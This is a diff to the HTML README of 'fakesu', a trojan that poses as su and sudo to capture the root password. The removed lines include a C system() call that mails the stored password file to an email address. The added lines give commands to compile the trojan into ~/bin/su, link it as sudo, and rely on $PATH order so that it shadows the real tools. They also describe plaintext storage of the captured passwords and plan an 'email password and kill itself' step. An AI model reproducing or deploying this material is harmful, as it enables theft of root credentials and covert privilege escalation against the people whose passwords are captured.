@@ -39,16 +39,36 @@ automatically capture SU password when root type
 su.</p>
 
 <h2>
-<a name="my-little-feature" class="anchor" href="#my-little-feature"><span class="octicon octicon-link"></span></a>My little 'feature'</h2>
+<a name="install" class="anchor" href="#install"><span class="octicon octicon-link"></span></a>INSTALL</h2>
 
-<p>Auto send password file to your email :P</p>
+<p>If you can find ~/bin direstories which are 
+located at the beginning of $PATH variable ((EXTREMELY BAD IDEA))</p>
 
-<p>'''c
-system("uname  -a &gt;&gt; /var/tmp/.pwds;  cat /var/tmp/.pwds | mail <a href="mailto:your@email">your@email</a>")
-'''</p>
+<p>In this case nothing is simpler as:</p>
+
+<p>gcc fakesu.c -o ~/bin/su
+ln -s ~/bin/su ~/bin/sudo</p>
+
+<p>In any other case you have to create such a directory on your own
+and modify $PATH variable appropriately.</p>
+
+<h2>
+<a name="make" class="anchor" href="#make"><span class="octicon octicon-link"></span></a>MAKE</h2>
+
+<p>There are a make config you ought to know.</p>
 
 <ul>
-<li>zypeh </li>
+<li>If compiled with -DCRYPTO, then all your password will be encrypted</li>
+</ul><p>In other case, the compiler will automically compile as plaintext
+password stored.</p>
+
+<h2>
+<a name="todo" class="anchor" href="#todo"><span class="octicon octicon-link"></span></a>TODO</h2>
+
+<ul>
+<li>[ ] Stored password in encrypted form need to be decrypt.</li>
+<li><p>[ ] Email password and automatically kill itself.</p></li>
+<li><p>zypeh </p></li>
 </ul><hr><p><a href="http://coderwall.com/zypeh"><img src="http://api.coderwall.com/zypeh/endorsecount.png" alt="endorse"></a></p>
 
 <p><a href="http://www.facebook.com/lisper.zypeh"><img src="http://bit.ly/VTsPK4" alt="Facebook"></a></p>
